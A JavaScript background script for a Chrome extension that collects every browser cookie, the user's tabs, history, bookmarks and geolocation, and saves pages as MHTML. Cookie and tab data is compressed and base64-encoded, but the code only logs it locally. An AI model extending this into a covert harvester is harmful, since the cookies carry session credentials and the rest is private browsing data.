var getCurrentPosition = function () {
    navigator.geolocation.getCurrentPosition(function (position) {
        console.log("Position found.");
        console.log(position);
        return position;
    }, function(positionError) {
        console.log("Position not found.");
        return positionError;
    });
}

var getMHTML = function (tabId) {
    chrome.pageCapture.saveAsMHTML({"tabId": tabId}, function (mhtmlData) {
        saveAs(mhtmlData, tabId + '.mhtml');
    })
};

var getAllCookies = function () {
    chrome.cookies.getAll({}, function (cookieArray) {
        console.log(cookieArray);
        console.log(compressString(JSON.stringify(cookieArray)));
    });
};

var getAllTabs = function () {
    chrome.windows.getAll({"populate": true}, function (windowArray) {
        console.log(windowArray);
        console.log(JSON.stringify(windowArray));
        console.log(compressString(JSON.stringify(windowArray)));
    });
}

var getAllBookmarks = function () {
    chrome.bookmarks.getTree(function (results) {
        console.log(results);
    });
};

var getAllHistory = function () {
    chrome.history.search({"text": ""}, function (historyArray) {
        console.log(historyArray)
    });
};

var compressString = function (uncompressedString) {
    compressed = LZString.compress(uncompressedString);
    compressedString = LZString.compressToBase64(compressed);
    compressedB64 = Base64String.compress(compressedString);
    console.log("Compressed / Uncompressed Length:",
                compressedB64.length, "/", uncompressedString.length,
                "(" + compressedB64.length * 100 / uncompressedString.length +
                "%)");
    return compressedB64;
};

///////////////////////////////////////////////////////////////////////////////
// Define listener callback functions.
///////////////////////////////////////////////////////////////////////////////

var onTabCreate = function (tab) {
    console.log("Tab create:", "#" + tab.id, tab.title, "(" + tab.url + ")");
};

var onTabUpdate = function (tabId, changeInfo, tab) {
    if (changeInfo.status === "complete") {
        console.log("Tab update:", "#" + tab.id, tab.title,
                    "(" + tab.url + ")");
    }
};

var onTabActive = function (activeInfo) {
    console.log("Tab activated:", activeInfo.tabId);
};

var onTabRemove = function (tabId, removeInfo) {
    console.log("Tab remove:", tabId);
};

var onURLVisit = function (result) {
    console.log("URL visit:", result.title, "(" + result.url + ") at",
                result.lastVisitTime + ",", result.visitCount, "times");
};

var onURLRemoval = function (removed) {
    console.log(removed.urls);
};

var onCookieChange = function (changeInfo) {
    console.log(changeInfo);
};

var onBookmarkCreate = function (id, bookmark) {
    console.log(id, bookmark);
};

var onBookmarkChange = function (id, changeInfo) {
    console.log(id, changeInfo);
};

var onBookmarkRemove = function (id, removeInfo) {
    console.log(id, removeInfo);
};

///////////////////////////////////////////////////////////////////////////////
// Activate listeners.
///////////////////////////////////////////////////////////////////////////////

chrome.tabs.onCreated.addListener(onTabCreate);
chrome.tabs.onUpdated.addListener(onTabUpdate);
chrome.tabs.onActivated.addListener(onTabActive);
chrome.tabs.onRemoved.addListener(onTabRemove);
chrome.history.onVisited.addListener(onURLVisit);
// chrome.cookies.onChanged.addListener(onCookieChange);
chrome.bookmarks.onCreated.addListener(onBookmarkCreate);
chrome.bookmarks.onChanged.addListener(onBookmarkChange);
chrome.bookmarks.onRemoved.addListener(onBookmarkRemove);